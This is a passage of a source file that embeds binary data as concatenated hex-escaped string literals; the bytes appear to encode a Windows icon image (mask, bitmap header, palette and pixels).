x42\\x46\\x43\\x4d\\x4d\\x4d\\x52\\x6c\\xeb\\xfe\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd".\r\n"\\xfd\\xfd\\xfd\\x97\\x56\\x55\\x55\\x55\\x9a\\xf6\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\x8c\\x3a\\x38".\r\n"\\x23\\x19\\x19\\x15\\x15\\x0a\\xf1\\x33\\x00\\x00\\x0f\\xf5\\x65\\x42\\x46\\x4d\\x4d\\x51\\x9d\\xfe".\r\n"\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xf4\\x6f\\x56\\x56\\x55\\x55\\x52\\x52\\x5a\\xb9\\xfd".\r\n"\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xb4\\x39\\x23\\x23\\x19\\x19\\x15\\x34\\xf5\\x07\\x00\\x00\\x2f\\xbe".\r\n"\\xad\\x46\\x43\\x4d\\x5a\\xcd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xd0\\x5b\\x58\\x56".\r\n"\\x56\\x56\\x55\\x55\\x52\\x51\\x51\\x6e\\xec\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xdc\\x5c\\x19\\x19\\x15".\r\n"\\x15\\xa6\\xbe\\x2f\\x00\\x00\\x00\\x71\\xf0\\x46\\x46\\x6e\\xeb\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd".\r\n"\\xfd\\xfd\\xfd\\xbb\\x58\\x58\\x58\\x56\\x56\\x56\\x55\\x52\\x52\\x51\\x51\\x51\\x46\\x9b\\xfa\\xfd".\r\n"\\xfd\\xfd\\xfd\\xfd\\xf5\\x62\\x19\\x19\\x1a\\xee\\x71\\x00\\x00\\x00\\x00\\x0f\\xe3\\x9c\\x9f\\xfd".\r\n"\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfa\\x98\\x58\\x58\\x58\\x58\\x58\\x56\\x56\\x55\\x55".\r\n"\\x52\\x51\\x51\\x51\\x46\\x46\\x59\\xc2\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\x8b\\x15\\x7f\\xe3\\x0f\\x00".\r\n"\\x00\\x00\\x00\\x84\\x77\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xfd\\xed\\x6f\\x58\\x58".\r\n"\\x58\\x58\\x58\\x56\\x56\\x56\\x55\\x55\\x52\\x51\\x51\\x51\\x46\\x46\\x46\\x42\\x68\\xe3\\xfd\\xfd".\r\n"\\xfd\\xfd\\xfd\\xb2\\xee\\x77\\x86\\x00\\x00\\x00\\x00\\x00\\x0f\\xd7\\xeb\\xb8\\xb8\\xb9\\xb9\\xb9".\r\n"\\xba\\xba\\xba\\xb9\\x58\\x58\\x58\\x58\\x58\\x58\\x57\\x57\\x56\\x56\\x55\\x52\\x52\\x51\\x51\\x51".\r\n"\\x46\\x46\\x43\\x42\\x3f\\x3f\\x99\\xfa\\xfd\\xfd\\xfd\\xfd\\xd9\\x0f\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\xa4\\x2f\\xfa\\x6a\\x4d\\x51\\x51\\x55\\x55\\x55\\x56\\x56\\x57\\x57\\x58\\x58\\x58\\x57\\x5b\\x56".\r\n"\\x56\\x55\\x55\\x52\\x52\\x51\\x51\\x46\\x4d\\x43\\x43\\x42\\x3f\\x3a\\x37\\x4a\\xc3\\xfd\\xfd\\xfd".\r\n"\\x31\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2f\\x91\\xe5\\x59\\x51\\x51\\x51\\x52\\x55\\x55\\x56".\r\n"\\x56\\x5b\\x56\\x56\\x5b\\x56\\x56\\x56\\x56\\x55\\x55\\x52\\x51\\x51\\x51\\x4d\\x46\\x46\\x42\\x42".\r\n"\\x3f\\x3a\\x3a\\x23\\x23\\x80\\xfd\\xa4\\x2f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0f\\xc6".\r\n"\\xcf\\x51\\x51\\x51\\x52\\x52\\x55\\x55\\x55\\x56\\x56\\x56\\x56\\x56\\x56\\x56\\x55\\x55\\x52\\x52".\r\n"\\x51\\x51\\x4d\\x46\\x4d\\x43\\x42\\x42\\x3a\\x3a\\x3a\\x37\\x23\\xcb\\xc6\\x0f\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1b\\xd7\\xcd\\x51\\x51\\x52\\x52\\x52\\x55\\x55\\x55\\x56\\x56".\r\n"\\x56\\x56\\x55\\x55\\x55\\x52\\x52\\x52\\x4d\\x51\\x46\\x4d\\x43\\x43\\x42\\x42\\x3a\\x3a\\x37\\x37".\r\n"\\xc1\\xd7\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1b\\xd9\\xce\\x5a".\r\n"\\x51\\x52\\x52\\x52\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x52\\x52\\x4d\\x51\\x51\\x4d\\x4d\\x46".\r\n"\\x43\\x43\\x3f\\x3f\\x3a\\x3a\\x3e\\xcb\\xd7\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x1b\\xc6\\xeb\\x6c\\x51\\x51\\x52\\x52\\x52\\x52\\x55\\x52\\x52\\x52\\x52".\r\n"\\x4d\\x52\\x51\\x4d\\x4d\\x46\\x46\\x46\\x43\\x43\\x3f\\x3f\\x3a\\x64\\xe3\\xc6\\x1b\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0f\\xa3\\xfa\\xa2\\x53\\x51".\r\n"\\x52\\x51\\x52\\x52\\x52\\x51\\x52\\x52\\x51\\x51\\x51\\x4d\\x4d\\x46\\x4d\\x43\\x43\\x3f\\x3f\\x41".\r\n"\\x99\\xf5\\x91\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x2f\\x33\\xd9\\xf0\\x9a\\x53\\x51\\x51\\x51\\x51\\x51\\x51\\x4d\\x51\\x4d\\x4d\\x4d".\r\n"\\x46\\x46\\x43\\x43\\x3f\\x41\\x89\\xeb\\xd7\\x31\\x2f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa3\\x0f\\x7e\\xe6\\xf5\\xae\\x6e\\x51".\r\n"\\x51\\x51\\x51\\x51\\x4d\\x4d\\x4d\\x46\\x46\\x43\\x43\\x67\\xad\\xf0\\xe3\\x77\\x10\\xa4\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x86\\x0f\\x71\\xbe\\xf6\\xf6\\xcd\\xa2\\x96\\x6c\\x50\\x50\\x65\\x83\\xa1\\xc5\\xf0\\xf5".\r\n"\\xbe\\x71\\x10\\x86\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2f\\x0f\\x33\\x8e\\xaa\\xd1\\xe6".\r\n"\\xee\\xee\\xe3\\xd5\\xaa\\x8f\\x31\\x10\\x30\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x87\\x70\\x20\\x01\\x04\\x01\\x07\\x1e\\x70\\x87\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xe0\\x07\\xff\\xff\\x00".\r\n"\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\x00\\x00\\xff\\xf8\\x00\\x00\\x1f\\xff\\x00\\x00\\xff\\xe0\\x00".\r\n"\\x00\\x07\\xff\\x00\\x00\\xff\\xc0\\x00\\x00\\x03\\xff\\x00\\x00\\xff\\x80\\x00\\x00\\x01\\xff\\x00".\r\n"\\x00\\xff\\x00\\x00\\x00\\x00\\xff\\x00\\x00\\xfe\\x00\\x00\\x00\\x00\\x7f\\x00\\x00\\xfc\\x00\\x00".\r\n"\\x00\\x00\\x3f\\x00\\x00\\xf8\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x0f\\x00".\r\n"\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\xc0\\x00\\x00".\r\n"\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00".\r\n"\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x80\\x00\\x00".\r\n"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00".\r\n"\\x00\\x80\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00".\r\n"\\x00\\x00\\x03\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00".\r\n"\\x00\\xe0\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x0f\\x00\\x00\\xf8\\x00\\x00".\r\n"\\x00\\x00\\x1f\\x00\\x00\\xfc\\x00\\x00\\x00\\x00\\x3f\\x00\\x00\\xfe\\x00\\x00\\x00\\x00\\x7f\\x00".\r\n"\\x00\\xff\\x00\\x00\\x00\\x00\\xff\\x00\\x00\\xff\\x80\\x00\\x00\\x01\\xff\\x00\\x00\\xff\\xc0\\x00".\r\n"\\x00\\x03\\xff\\x00\\x00\\xff\\xe0\\x00\\x00\\x07\\xff\\x00\\x00\\xff\\xf8\\x00\\x00\\x1f\\xff\\x00".\r\n"\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\x00\\x00\\xff\\xff\\xe0\\x07\\xff\\xff\\x00\\x00\\x28\\x00\\x00".\r\n"\\x00\\x20\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\xa1\\x6a\\x00\\x00\\xa3\\x6c\\x00\\x00\\xa5\\x6d\\x00\\x00\\xa7\\x70\\x00\\x00\\xa9\\x72\\x00".\r\n"\\x00\\xad\\x75\\x00\\x00\\xad\\x76\\x04\\x00\\xa6\\x72\\x0e\\x00\\xab\\x77\\x0f\\x00\\xb1\\x78\\x00".\r\n"\\x00\\xb4\\x7a\\x00\\x00\\xb6\\x7c\\x00\\x00\\xb5\\x7c\\x04\\x00\\xb8\\x7e\\x00\\x00\\xaa\\x79\\x1b".\r\n"\\x00\\xba\\x80\\x00\\x00\\xbc\\x82\\x00\\x00\\xbe\\x84\\x00\\x00\\xb9\\x83\\x10\\x00\\xb1\\x80\\x1f".\r\n"\\x00\\xb4\\x82\\x1c\\x00\\xb6\\x84\\x1c\\x00\\xbd\\x8c\\x22\\x00\\xb0\\x82\\x2b\\x00\\xb2\\x84\\x2b".\r\n"\\x00\\xbc\\x8e\\x2d\\x00\\xb5\\x8a\\x39\\x00\\xb6\\x8c\\x3b\\x00\\xb6\\x8d\\x3d\\x00\\xbb\\x90\\x38".\r\n"\\x00\\xc1\\x86\\x00\\x00\\xc3\\x88\\x00\\x00\\xc4\\x89\\x00\\x00\\xc7\\x8c\\x00\\x00\\xc9\\x8d\\x00".\r\n"\\x00\\xcc\\x8f\\x00\\x00\\xc5\\x8d\\x0b\\x00\\xcd\\x90\\x00\\x00\\xce\\x93\\x04\\x00\\xca\\x91\\x08".\r\n"\\x00\\xd0\\x92\\x00\\x00\\xd2\\x95\\x00\\x00\\xd4\\x97\\x00\\x00\\xd6\\x98\\x00\\x00\\xd5\\x99\\x04".\r\n"\\x00\\xd8\\x9a\\x00\\x00\\xdb\\x9d\\x00\\x00\\xdc\\x9d\\x00\\x00\\xc5\\x8e\\x11\\x00\\xc3\\x8f\\x19".\r\n"\\x00\\xce\\x95\\x10\\x00\\xce\\x97\\x15\\x00\\xc3\\x90\\x1c\\x00\\xc7\\x93\\x1d\\x00\\xc8\\x95\\x1e".\r\n"\\x00\\xd1\\x98\\x11\\x00\\xde\\xa0\\x00\\x00\\xe1\\xa2\\x00\\x00\\xe3\\xa4\\x00\\x00\\xe5\\xa5\\x00".\r\n"\\x00\\xe8\\xa7\\x00\\x00\\xe9\\xa9\\x00\\x00\\xec\\xab\\x00\\x00\\xed\\xac\\x00\\x00\\xe0\\xa3\\x09".\r\n"\\x00\\xf0\\xae\\x00\\x00\\xf2\\xb0\\x00\\x00\\xf4\\xb2\\x00\\x00\\xf6\\xb4\\x00\\x00\\xf8\\xb6\\x00".\r\n"\\x00\\xfb\\xb8\\x00\\x00\\xfc\\xb9\\x00\\x00\\xfb\\xba\\x04\\x00\\xe6\\xab\\x11\\x00\\xe4\\xac\\x18".\r\n"\\x00\\xe4\\xae\\x1e\\x00\\xeb\\xb0\\x12\\x00\\xec\\xb4\\x1f\\x00\\xf7\\xbb\\x15\\x00\\xc5\\x95\\x2d".\r\n"\\x00\\xce\\x9d\\x28\\x00\\xd9\\xa5\\x25\\x00\\xd2\\xa1\\x2e\\x00\\xd8\\xa7\\x2f\\x00\\xd1\\xa1\\x31".\r\n"\\x00\\xda\\xa9\\x30\\x00\\xd1\\xa4\\x3b\\x00\\xdb\\xae\\x3e\\x00\\xe8\\xb5\\x31\\x00\\xe4\\xb6\\x3c".\r\n"\\x00\\xee\\xbe\\x3b\\x00\\xe9\\xba\\x3d\\x00\\xf9\\xc4\\x2e\\x00\\xf3\\xc0\\x33\\x00\\xb9\\x90\\x44".\r\n"\\x00\\xbd\\x96\\x4e\\x00\\xbe\\x97\\x50\\x00\\xcb\\xa0\\x43\\x00\\xc9\\xa0\\x46\\x00\\xc8\\xa1\\x4f".\r\n"\\x00\\xd0\\xa6\\x48\\x00\\xdc\\xb3\\x4f\\x00\\xc4\\xa0\\x5d\\x00\\xd9\\xb1\\x53\\x00\\xd6\\xb0\\x59".\r\n"\\x00\\xdf\\xb8\\x59\\x00\\xe6\\xb9\\x46\\x00\\xea\\xbb\\x41\\x00\\xea\\xbf\\x4b\\x00\\xe2\\xbd\\x5f".\r\n"\\x00\\xc3\\xa2\\x60\\x00\\xc4\\xa2\\x61\\x00\\xc5\\xa4\\x63\\x00\\xc5\\xa4\\x65\\x00\\xca\\xa9\\x67".\r\n"\\x00\\xdb\\xb9\\x69\\x00\\xdd\\xbb\\x69\\x00\\xca\\xab\\x70\\x00\\xca\\xac\\x72\\x00\\xd2\\xb3\\x71".\r\n"\\x00\\xd6\\xb6\\x71\\x00\\xfd\\xd3\\x5a\\x00\\xe9\\xc6\\x69\\x00\\xf1\\xcd\\x6e\\x00\\xe1\\xc3\\x7d".\r\n"\\x00\\xe2\\xc4\\x7d\\x00\\xf2\\xd2\\x7b\\x00\\xcf\\xb4\\x81\\x00\\xd1\\xb5\\x81\\x00\\xd4\\xb8\\x82".\r\n"\\x00\\xdb\\xbf\\x83\\x00\\xd9\\xbe\\x87\\x00\\xd2\\xb9\\x88\\x00\\xd4\\xba\\x89\\x00\\xd6\\xbc\\x8a".\r\n"\\x00\\xda\\xc0\\x8a\\x00\\xdd\\xc3\\x8a\\x00\\xdf\\xc5\\x89\\x00\\xd8\\xc2\\x97\\x00\\xd8\\xc2\\x98".\r\n"\\x00\\xe0\\xc4\\x86\\x00\\xe4\\xc8\\x87\\x00\\xeb\\xcd\\x81\\x00\\xe0\\xc5\\x8b\\x00\\xe5\\xcb\\x8e".\r\n"\\x00\\xe7\\xcd\\x8c\\x00\\xeb\\xd0\\x8a\\x00\\xee\\xd3\\x8b\\x00\\xeb\\xd0\\x8d\\x00\\xec\\xd1\\x8c".\r\n"\\x00\\xf2\\xd7\\x8e\\x00\\xea\\xd1\\x92\\x00\\xed\\xd4\\x94\\x00\\xf2\\xd7\\x90\\x00\\xf6\\xde\\x9a".\r\n"\\x00\\xfe\\xe1\\x8d\\x00\\xdd\\xca\\xa7\\x00\\xde\\xcc\\xaa\\x00\\xe0\\xce\\xab\\x00\\xe0\\xce\\xac".\r\n"\\x00\\xe2\\xd0\\xac\\x00\\xe9\\xd6\\xab\\x00\\xe9\\xd6\\xad\\x00\\xed\\xdb\\xae\\x00\\xf0\\xde\\xaf".\r\n"\\x00\\xeb\\xda\\xb6\\x00\\xe6\\xd8\\xbe\\x00\\xea\\xda\\xb9\\x00\\xee\\xdf\\xbd\\x00\\xf6\\xe3\\xaf".\r\n"\\x00\\xf4\\xe1\\xb0\\x00\\xf0\\xe0\\xb7\\x00\\xf4\\xe3\\xb7\\x00\\xf8\\xe5\\xb0\\x00\\xfb\\xe9\\xb4".\r\n"\\x00\\xf1\\xe2\\xb9\\x00\\xf6\\xe6\\xb9\\x00\\xf1\\xe3\\xbf\\x00\\xf9\\xe8\\xb9\\x00\\xfd\\xed\\xbe".\r\n"\\x00\\xe6\\xd9\\xc0\\x00\\xe8\\xda\\xc1\\x00\\xe9\\xdc\\xc2\\x00\\xec\\xde\\xc2\\x00\\xeb\\xde\\xc4".\r\n"\\x00\\xec\\xdf\\xc4\\x00\\xee\\xe1\\xc5\\x00\\xf2\\xe4\\xc4\\x00\\xf0\\xe7\\xd6\\x00\\xf1\\xe8\\xd6".\r\n"\\x00\\xf2\\xea\\xd9\\x00\\xf6\\xee\\xda\\x00\\xf6\\xee\\xdc\\x00\\xfa\\xf2\\xdd\\x00\\xf7\\xf1\\xe1".\r\n"\\x00\\xfc\\xf5\\xe1\\x00\\xfa\\xf4\\xe6\\x00\\xf8\\xf3\\xe9\\x00\\xfb\\xf6\\xe8\\x00\\xf9\\xf5\\xee".\r\n"\\x00\\xfb\\xf8\\xef\\x00\\xfc\\xf9\\xed\\x00\\xf9\\xf6\\xf0\\x00\\xfb\\xfa\\xf7\\x00\\xfc\\xfa\\xf5".\r\n"\\x00\\xfe\\xfc\\xf5\\x00\\xfd\\xfb\\xf9\\x00\\xfd\\xfc\\xf9\\x00\\xfe\\xfe\\xfe\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x1c\\x1c\\x1c\\x1d\\x1c\\x1c".\r\n"\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x70\\x5f\\x8c\\xb5\\x9f\\x80\\x72\\x72\\x80\\x9f\\xb5\\x8c\\x5f\\x70\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x76\\x61\\xb5\\x86\\x19\\x03\\x03\\x03".\r\n"\\x03\\x03\\x03\\x03\\x01\\x18\\x86\\xb5\\x61\\x76\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x1c\\x9f\\x86\\x09\\x03\\x05\\x04\\x04\\x03\\x04\\x03\\x03\\x03\\x03\\x03\\x01\\x08".\r\n"\\x86\\x9f\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1c\\xb6\\x1e\\x05\\x05\\x05".\r\n"\\x05\\x05\\x05\\x05\\x05\\x05\\x04\\x04\\x03\\x03\\x03\\x03\\x01\\x1c\\xb5\\x1c\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x1c\\xb6\\x15\\x05\\x05\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x05\\x0a\\x05\\x05".\r\n"\\x05\\x04\\x04\\x03\\x03\\x01\\x0f\\xb5\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1c\\xb6\\x15\\x0a".\r\n"\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0e\\x0a\\x0a\\x0a\\x05\\x05\\x05\\x04\\x03\\x03\\x03\\x0f".\r\n"\\xb6\\x1c\\x00\\x00\\x00\\x00\\x00\\x76\\x9f\\xcb\\x78\\x0a\\x0e\\x0e\\x0e\\x10\\x10\\x10\\x10\\x10".\r\n"\\x0e\\x0e\\x0a\\x0a\\x0a\\x0a\\x05\\x05\\x05\\x03\\x03\\x03\\x1c\\x9d\\x76\\x00\\x00\\x00\\x00\\x61".\r\n"\\xbf\\xff\\xff\\xbe\\x62\\x10\\x10\\x10\\x1f\\x1f\\x10\\x10\\x10\\x10\\x10\\x10\\x0e\\x0a\\x64\\xbe".\r\n"\\xbe\\xbe\\xbd\\xbd\\xbd\\xff\\x61\\x00\\x00\\x00\\x70\\xb6\\x13\\x78\\xff\\xff\\xff\\xa2\\x37\\x21".\r\n"\\x21\\x21\\x21\\x21\\x21\\x21\\x1f\\x10\\x10\\x8d\\xff\\xff\\xff\\xff\\xff\\xff\\xc6\\x67\\xa7\\x70".\r\n"\\x00\\x00\\x5f\\x89\\x10\\x10\\x65\\xc9\\xff\\xff\\xcd\\x7d\\x28\\x23\\x23\\x23\\x23\\x21\\x21\\x31".\r\n"\\xa6\\xff\\xff\\xff\\xff\\xff\\xff\\xb6\\x14\\x03\\x86\\x5f\\x00\\x00\\x8c\\x50\\x10\\x1f\\x21\\x51".\r\n"\\xbf\\xff\\xff\\xff\\xbf\\x66\\x29\\x26\\x26\\x23\\x53\\xc1\\xff\\xff\\xff\\xff\\xff\\xff\\x84\\x05".\r\n"\\x05\\x03\\x19\\x8b\\x00\\x70\\xb6\\x10\\x21\\x21\\x23\\x23\\x38\\xb0\\xff\\xff\\xff\\xff\\xac\\x52".\r\n"\\x29\\x6a\\xcd\\xff\\xff\\xff\\xff\\xff\\xc9\\x62\\x0a\\x0a\\x05\\x05\\x03\\xb5\\x70\\x1c\\xa3\\x21".\r\n"\\x21\\x23\\x23\\x29\\x29\\x2d\\x99\\xff\\xff\\xff\\xff\\xff\\xac\\xff\\xff\\xff\\xff\\xff\\xff\\xb6".\r\n"\\x32\\x0e\\x0a\\x0a\\x05\\x05\\x05\\x9f\\x1c\\x1c\\x8d\\x21\\x23\\x26\\x29\\x2d\\x2e\\x2e\\x2e\\x7b".\r\n"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7d\\x23\\x1f\\x10\\x10\\x0a\\x0a\\x05\\x05\\x80".\r\n"\\x1c\\x1c\\x74\\x23\\x23\\x29\\x2d\\x2e\\x2e\\x3a\\x3a\\x3a\\x6c\\xca\\xff\\xff\\xff\\xff\\xff\\xff".\r\n"\\xc5\\x58\\x26\\x23\\x21\\x1f\\x10\\x0e\\x0a\\x0a\\x05\\x73\\x5f\\x1d\\x74\\x23\\x29\\x2d\\x2e\\x2e".\r\n"\\x3a\\x3a\\x3d\\x3d\\x7c\\xcd\\xff\\xff\\xff\\xff\\xff\\xff\\xcd\\x6a\\x29\\x26\\x21\\x21\\x10\\x0e".\r\n"\\x0a\\x0a\\x05\\x73\\x1d\\x1c\\x8e\\x26\\x29\\x2e\\x2e\\x3a\\x3a\\x3d\\x4d\\xae\\xff\\xff\\xff\\xff".\r\n"\\xff\\xff\\xff\\xff\\xff\\xff\\x99\\x26\\x23\\x21\\x1f\\x10\\x0e\\x0a\\x05\\x82\\x1d\\x1c\\xa3\\x29".\r\n"\\x2d\\x2e\\x3a\\x3a\\x3d\\x5b\\xc5\\xff\\xff\\xff\\xff\\xff\\xcd\\x9b\\xcd\\xff\\xff\\xff\\xff\\xb2".\r\n"\\x34\\x21\\x1f\\x10\\x0e\\x0a\\x0a\\x9f\\x1d\\x70\\xbb\\x29\\x2e\\x2e\\x3a\\x3d\\x7f\\xff\\xff\\xff".\r\n"\\xff\\xff\\xff\\xc5\\x5e\\x3d\\x4e\\xaa\\xff\\xff\\xff\\xff\\xc3\\x55\\x1f\\x10\\x0e\\x0a\\x0a\\xb6".\r\n"\\x70\\x00\\x8c\\x56\\x2e\\x3a\\x4b\\xb3\\xff\\xff\\xff\\xff\\xff\\xff\\xb4\\x4f\\x45\\x45\\x3d\\x3d".\r\n"\\x6d\\xc2\\xff\\xff\\xff\\xcd\\x69\\x10\\x0e\\x0a\\x1a\\x8c\\x00\\x00\\x5f\\x96\\x2e\\x6b\\xc9\\xff".\r\n"\\xff\\xff\\xff\\xff\\xff\\x9c\\x49\\x46\\x45\\x45\\x3d\\x3d\\x3a\\x41\\x8f\\xcd\\xff\\xff\\xff\\x90".\r\n"\\x10\\x0e\\x88\\x5f\\x00\\x00\\x70\\xb6\\x96\\xff\\xff\\xff\\xff\\xff\\xff\\xcd\\x7a\\x49\\x49\\x46".\r\n"\\x45\\x45\\x3d\\x3d\\x3d\\x3a\\x2e\\x52\\xac\\xff\\xff\\xff\\xb6\\x17\\xb6\\x70\\x00\\x00\\x00\\x61".\r\n"\\xca\\xac\\xae\\xb0\\xb4\\xaf\\xaf\\x5d\\x49\\x49\\x46\\x46\\x45\\x42\\x42\\x3d\\x3a\\x3a\\x2e\\x29".\r\n"\\x29\\x66\\xc3\\xff\\xff\\xcd\\x61\\x00\\x00\\x00\\x00\\x76\\x9f\\x5a\\x3a\\x3d\\x3d\\x42\\x45\\x45".\r\n"\\x46\\x46\\x46\\x46\\x45\\x3d\\x3d\\x3d\\x3a\\x3a\\x2e\\x2d\\x26\\x21\\x25\\x89\\xff\\x9d\\x76\\x00".\r\n"\\x00\\x00\\x00\\x00\\x1c\\xbb\\x4b\\x3a\\x3d\\x3d\\x45\\x45\\x45\\x45\\x45\\x45\\x3d\\x45\\x3d\\x3d".\r\n"\\x3a\\x2e\\x2e\\x29\\x26\\x23\\x1f\\x35\\xb6\\x1d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1c\\xb2\\x4e".\r\n"\\x3d\\x3d\\x3d\\x3d\\x45\\x42\\x42\\x42\\x3d\\x3d\\x3d\\x3a\\x3a\\x2e\\x2e\\x29\\x23\\x21\\x37\\xb6".\r\n"\\x1d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1c\\xbb\\x6c\\x3d\\x3d\\x3d\\x3d\\x45\\x3d\\x3d".\r\n"\\x3d\\x3d\\x3e\\x3a\\x2